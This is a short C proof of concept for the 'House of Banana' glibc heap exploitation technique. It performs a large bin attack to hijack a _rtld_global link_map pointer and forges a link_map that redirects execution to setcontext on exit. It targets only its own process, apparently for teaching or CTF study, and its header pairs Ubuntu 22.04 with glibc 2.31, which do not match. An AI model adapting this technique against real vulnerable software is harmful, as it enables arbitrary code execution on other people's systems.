// Ubu 22.04/glibc 2.31
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define rtld_global 0x23c060
#define rtld_global_3_next 0x1f2018
#define setcontext 0x54f5d

void func() { 
	printf("hello world\n");
}

int main() {
	puts("\033[32mhouse of banana's poc\033[0m");
	size_t libc_base = *(size_t*)&stdin - 0x1ec980;
	printf("\033[31mlibc_base: %lx\033[0m\n", libc_base);
  	size_t _3_l_next = libc_base + rtld_global_3_next;
	printf("\033[31m_3_l_next: %lx\033[0m\n", _3_l_next);
	char *ptr0 = malloc(0x450);
	char *gap = malloc(0x10);
	char *ptr1 = malloc(0x440);
	gap = malloc(0x10);
	size_t *ptr2 = malloc(0x410);
	gap = malloc(0x10);	
	free(ptr0);
	//put ptr0 into large bin
	malloc(0x500);
	free(ptr1); //free ptr1 into unsorted bin
	free(ptr2); //free ptr2 into unsorted bin
	*(size_t *)(ptr0 + 0x18) = _3_l_next - 0x20;
	malloc(0x410); //large bin attack to hijack _rtld_global_3_next	
	//fake link_map
	
	size_t *link_map = (size_t *)ptr1;
	link_map[1] = 0;
	link_map[3] = (size_t)ptr1 - 0x10;
	link_map[32] = (size_t)&link_map[32];
	link_map[33] = (size_t)&link_map[36];
	link_map[34] = (size_t)&link_map[34];
	link_map[35] = 16;
	link_map[36] = (size_t)(libc_base + setcontext);
	link_map[37] = (size_t)func;
	link_map[49] = 0xdeadbeef; // r15
	
	*(int*)((char*)link_map + 0x30c) = 8;

	return 0;
}
